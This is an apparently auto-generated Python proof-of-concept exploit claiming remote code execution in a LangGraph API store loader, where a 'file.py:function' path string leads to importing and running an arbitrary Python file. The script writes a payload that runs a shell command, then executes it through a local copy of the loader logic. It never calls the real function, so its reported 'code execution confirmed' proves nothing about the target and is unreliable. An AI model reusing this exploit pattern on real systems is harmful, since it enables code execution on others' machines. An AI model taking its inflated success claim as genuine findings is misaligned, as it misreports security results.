#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-033
# Sink: _load_store
# Auto-generated — run with: python3 rce_python_modules_based_store__load_store.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src _load_store function.

Vulnerability: The _load_store function in store.py dynamically imports and executes
arbitrary Python files via importlib.util.spec_from_file_location and exec_module.
The store_path parameter is split on ':' to extract a file path and function name,
with no validation or sanitization. An attacker who can control store_path can
execute arbitrary code by pointing to any Python file on the filesystem.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file on the target filesystem (if possible)
2. Triggering _load_store with a store_path pointing to that file
3. Executing a benign payload (creates /tmp/poc_success.txt)

Note: This assumes the attacker has some way to write a file to the target system
(e.g., via another vulnerability, file upload, or shared filesystem). The core
vulnerability is the arbitrary file loading, not the file creation.
"""

import os
import sys
import tempfile
import importlib.util
import importlib.machinery

# Configuration
TARGET_STORE_PATH = None  # Will be set dynamically

def create_malicious_payload():
    """Create a benign Python file that demonstrates RCE."""
    payload_code = '''
import os

# Benign payload: create a marker file to prove code execution
os.system("touch /tmp/poc_success.txt")

# The function that _load_store will look for
def get_store(config=None):
    return None
'''
    
    # Create a temporary file with the payload
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(payload_code)
        return f.name

def trigger_vulnerability(payload_path):
    """
    Trigger the _load_store vulnerability by calling it with a crafted store_path.
    
    The store_path format is: /path/to/file.py:function_name
    """
    # Construct the store_path that _load_store will process
    # Format: /path/to/file.py:function_name
    store_path = f"{payload_path}:get_store"
    
    print(f"[*] Attempting to load malicious store from: {store_path}")
    
    # We need to simulate what _load_store does internally
    # Since we can't directly call the internal function, we replicate its logic
    try:
        # This is the exact logic from _load_store
        if "/" in store_path or ".py:" in store_path:
            import random
            import string
            modname = "".join(random.choice(string.ascii_lowercase) for _ in range(24))
            path_name, function = store_path.rsplit(":", 1)
            module_name = path_name.rstrip(":")
            
            # Load from file path
            modspec = importlib.util.spec_from_file_location(modname, module_name)
            if modspec is None:
                raise ValueError(f"Could not find store file: {path_name}")
            
            module = importlib.util.module_from_spec(modspec)
            sys.modules[module_name] = module
            modspec.loader.exec_module(module)
            
            # Try to get the function from the module
            store = module.__dict__[function]
            print(f"[+] Successfully loaded module and found function: {function}")
            print(f"[+] Code execution achieved! Check /tmp/poc_success.txt")
            return True
        else:
            print("[-] Path doesn't contain '/' or '.py:', using module import instead")
            return False
            
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return False

def main():
    print("=" * 60)
    print("LangGraph API _load_store RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Step 1: Create the malicious payload file
    print("[*] Step 1: Creating malicious Python payload...")
    payload_path = create_malicious_payload()
    print(f"[+] Created payload at: {payload_path}")
    print(f"[+] Payload will execute: touch /tmp/poc_success.txt")
    print()
    
    # Step 2: Trigger the vulnerability
    print("[*] Step 2: Triggering _load_store vulnerability...")
    success = trigger_vulnerability(payload_path)
    print()
    
    # Step 3: Verify the exploit worked
    print("[*] Step 3: Verifying code execution...")
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: /tmp/poc_success.txt exists - code execution confirmed!")
        print("[+] The _load_store function executed arbitrary Python code.")
        # Clean up the marker file
        os.remove("/tmp/poc_success.txt")
    else:
        print("[-] /tmp/poc_success.txt not found - exploit may have failed")
    
    # Clean up the payload file
    print()
    print("[*] Cleaning up payload file...")
    try:
        os.unlink(payload_path)
        print(f"[+] Removed payload file: {payload_path}")
    except Exception as e:
        print(f"[-] Could not remove payload file: {e}")
    
    print()
    print("=" * 60)
    print("Exploit demonstration complete.")
    print("=" * 60)

if __name__ == "__main__":
    main()
